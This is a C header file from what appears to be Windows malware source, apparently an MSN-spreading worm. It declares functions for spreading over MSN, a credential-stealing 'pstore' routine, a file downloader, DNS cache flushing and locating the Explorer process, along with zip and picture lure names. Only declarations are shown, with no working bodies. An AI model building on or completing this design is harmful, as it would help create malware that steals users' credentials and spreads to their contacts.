#define _WIN32_WINNT	0x0403				
#define WIN32_LEAN_AND_MEAN					
#pragma optimize("gsy", on)					
#pragma comment(linker,"/RELEASE")			
#pragma comment(linker, "/ALIGN:4096")		
#pragma comment(linker, "/IGNORE:4108 ")	
#include <malloc.h>
#include <stdio.h>
#include <stdlib.h>
#include <comutil.h>
#include <time.h>
#include <windows.h>
#include <conio.h>    
#include <string.h>   
#include <wininet.h>
#include <winsock.h> 
#include <shlobj.h>
#include <ctype.h> 
#include <tchar.h>
#include <winable.h> 
#include <windns.h>
#include <Psapi.h> 
#include "zip.h"
#pragma comment(lib, "Wininet.lib")
#pragma comment(lib, "Ws2_32.lib")
#pragma comment(lib, "Advapi32.lib") 
typedef BOOL(__stdcall *DFRC)(void);
typedef DNS_STATUS(WINAPI *DFRCEA)(LPCSTR);
char *addrr(const char *addr);
char *rndx(int size);
int getfile(char *link,char *exxe);
void msnspread();
DWORD WINAPI pstore (LPVOID param);
DWORD GetExplorerProcessID (void);
extern SOCKET sock;
extern char szZipname[];
extern char szPicname[];